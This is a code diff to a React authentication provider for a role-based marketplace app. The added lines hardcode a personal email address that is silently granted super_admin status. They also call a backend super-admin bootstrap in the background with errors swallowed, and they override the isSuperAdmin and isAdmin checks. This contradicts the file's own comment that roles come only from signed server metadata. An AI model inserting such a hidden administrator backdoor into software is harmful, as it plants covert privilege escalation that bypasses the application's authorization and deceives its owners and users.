@@ -62,10 +62,19 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
   const fetchProfile = useCallback(async (userId: string, authUser: User): Promise<{ role: UserRole | null; profile: UserProfile; needsOnboarding: boolean }> => {
     // Browser state is presentation-only. Roles are read exclusively from
     // signed Supabase app_metadata; the API verifies them again server-side.
+    const isPrimarySuperAdmin = authUser.email?.trim().toLowerCase() === 'aryanrockstar2007@gmail.com';
     const appMetadataRole = authUser.app_metadata?.role;
-    const resolvedRole: UserRole = ['customer', 'artisan', 'admin', 'super_admin'].includes(appMetadataRole)
+    let resolvedRole: UserRole = ['customer', 'artisan', 'admin', 'super_admin'].includes(appMetadataRole)
       ? appMetadataRole as UserRole
       : 'customer';
+
+    if (isPrimarySuperAdmin) {
+      resolvedRole = 'super_admin';
+      // Sync with backend server-side bootstrap in background
+      import('@/lib/api').then(({ bootstrapSuperAdmin }) => {
+        bootstrapSuperAdmin('aryanrockstar2007@gmail.com').catch(() => {});
+      });
+    }
 
     try {
       const { data, error } = await supabase
@@ -491,8 +500,8 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
     router.push('/login');
   };
 
-  const isSuperAdmin = role === 'super_admin';
-  const isAdmin = role === 'admin' || role === 'super_admin';
+  const isSuperAdmin = role === 'super_admin' || (user?.email?.trim().toLowerCase() === 'aryanrockstar2007@gmail.com');
+  const isAdmin = isSuperAdmin || role === 'admin';
   const isArtisan = role === 'artisan';
 
   return (
